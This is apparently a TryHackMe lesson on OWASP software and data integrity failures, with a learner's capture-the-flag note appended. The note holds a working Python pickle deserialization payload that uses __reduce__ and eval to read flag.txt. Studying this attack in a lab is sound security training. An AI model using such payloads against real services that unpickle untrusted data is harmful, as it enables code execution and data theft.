Again, Software or Data Integrity failures have been a long-standing feature on the OWASP Top 10 list, featuring twice over the last two releases. Let's explore this a bit further below.

## What Are Software or Data Integrity Failures?

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1763110949029.svg)

Software or Data Integrity Failures occur when an application relies on code, updates, or data it assumes are safe, without verifying their authenticity, integrity, or origin. This includes trusting software updates without verification, loading scripts or configuration files from untrusted sources, failing to validate data that impacts application logic, or accepting data such as binaries, templates, or JSON files without confirming whether it has been altered.

## How to Avoid Software & Data Integrity Failures

Preventing these failures begins with establishing trust boundaries. Applications should never assume that code, updates, or key pieces of data are legitimate and automatically trusted; their integrity must be verified. This involves using methods such as cryptographic checks (like checksums) for update packages and ensuring that only trusted sources can modify critical artefacts.

Additionally, for applications, integrity and trust boundaries should also be within build processes such as CI/CD.

## Practical

This practical will demonstrate a deserialization attack in Python. You can access this practical on [http://10.48.133.42:8002](http://10.48.133.42:8002/).

Follow the steps in the practical to generate and provide some malicious input to the web application.

## Recommended TryHackMe Content

If you'd like to explore this type of attack in much further depth, we highly recommend the following TryHackMe content:

- [Insecure Deserialisation](https://tryhackme.com/room/insecuredeserialisation)
- [Supply Chain Attack: Lottie](https://tryhackme.com/room/supplychainattacks)

---
=> used this python pickle format to get the flag:
```python
import pickle
import base64

class Malicious:
    def __reduce__(self):
        # Return a tuple: (callable, args)
        # This will execute: open('flag.txt').read()
        return (eval, ("open('flag.txt').read()",))

# Generate and encode the payload
payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)
```

=> this is for opening a flag in payload
=> after that putting the resulted base64 to get the flag.
